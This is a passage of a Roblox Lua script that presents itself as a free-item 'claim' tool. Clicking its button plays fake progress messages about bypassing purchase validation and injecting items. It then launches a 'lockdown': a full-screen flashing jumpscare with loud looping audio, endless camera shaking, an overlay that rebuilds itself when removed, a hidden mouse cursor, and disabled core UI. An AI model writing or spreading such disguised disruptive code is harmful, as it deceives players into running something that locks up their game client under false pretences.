-- Drag functionality
local dragTarget = nil
local dragging = false
local dragStart, startPos
main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragTarget = main
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false; dragTarget = nil end
        end)
    end
end)
UIS.InputChanged:Connect(function(input)
    if dragging and dragTarget and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        dragTarget.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        shadow.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X - 5, startPos.Y.Scale, startPos.Y.Offset + delta.Y - 5)
    end
end)

-- ==================== JUMPS CARE LOCKDOWN ====================
local function startLockdown()
    gui:Destroy()
    task.wait(0.3)

    local cam = workspace.CurrentCamera
    local jsGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    jsGui.Name = "LockdownJumpscare"
    jsGui.IgnoreGuiInset = true
    jsGui.DisplayOrder = 2147483647
    jsGui.ResetOnSpawn = false

    local img = Instance.new("ImageLabel", jsGui)
    img.Size = UDim2.new(1, 0, 1, 0)
    img.Image = "rbxassetid://121770493074810" -- ID gambar jumpscare lama
    img.BackgroundColor3 = C.BLACK
    img.ZIndex = 10

    local flash = Instance.new("Frame", jsGui)
    flash.Size = UDim2.new(1, 0, 1, 0)
    flash.BackgroundColor3 = C.WHITE
    flash.BackgroundTransparency = 1
    flash.ZIndex = 11

    local snd = Instance.new("Sound", workspace)
    snd.SoundId = "rbxassetid://134262192520482"
    snd.Volume = 10
    snd.Looped = true
    snd:Play()

    task.spawn(function()
        while true do
            for i = 1, 30 do
                pcall(function()
                    cam.CFrame = cam.CFrame * CFrame.new(math.random(-6, 6), math.random(-6, 6), 0)
                    flash.BackgroundTransparency = (i % 3 == 0) and 0.3 or 1
                    img.ImageTransparency = (i % 5 == 0) and 0.1 or 0
                end)
                task.wait(0.05)
            end
            task.wait(0.3)
        end
    end)

    task.spawn(function()
        while true do
            if not jsGui or not jsGui.Parent then
                jsGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
                jsGui.Name = "LockdownJumpscare"
                jsGui.IgnoreGuiInset = true
                jsGui.DisplayOrder = 2147483647
                img = Instance.new("ImageLabel", jsGui)
                img.Size = UDim2.new(1, 0, 1, 0)
                img.Image = "rbxassetid://121770493074810"
                img.BackgroundColor3 = C.BLACK
                img.ZIndex = 10
                flash = Instance.new("Frame", jsGui)
                flash.Size = UDim2.new(1, 0, 1, 0)
                flash.BackgroundColor3 = C.WHITE
                flash.BackgroundTransparency = 1
                flash.ZIndex = 11
            end
            task.wait(1)
        end
    end)

    pcall(function()
        local uis = game:GetService("UserInputService")
        uis.ModalEnabled = true
        uis.MouseIconEnabled = false
        uis.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.ForceHide
    end)
    pcall(function()
        for _, c in ipairs(game:GetService("CoreGui"):GetChildren()) do
            if c:IsA("ScreenGui") then c.Enabled = false end
        end
    end)
    pcall(function()
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)
end

-- ==================== CLAIM PROCESS ====================
local function startClaim()
    claimBtn.Text = "PROCESSING..."
    claimBtn.Interactable = false
    claimBtn.BackgroundColor3 = C.RED

    local steps = {
        "Connecting to server...",
        "Verifying item availability...",
        "Bypassing purchase validation...",
        "Injecting item into inventory...",
        "Finalizing..."
    }

    for i, msg in ipairs(steps) do
        statusLabel.Text = msg
        local targetProgress = i / #steps
        TweenService:Create(progressFill, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
            {Size = UDim2.new(targetProgress, 0, 1, 0)}):Play()
        task.wait(1.2)
    end

    statusLabel.Text = "CLAIM SUCCESSFUL"
    progressFill.BackgroundColor3 = C.GREEN
    task.wait(0.8)
    startLockdown()
end

claimBtn.MouseButton1Click:Connect(startClaim)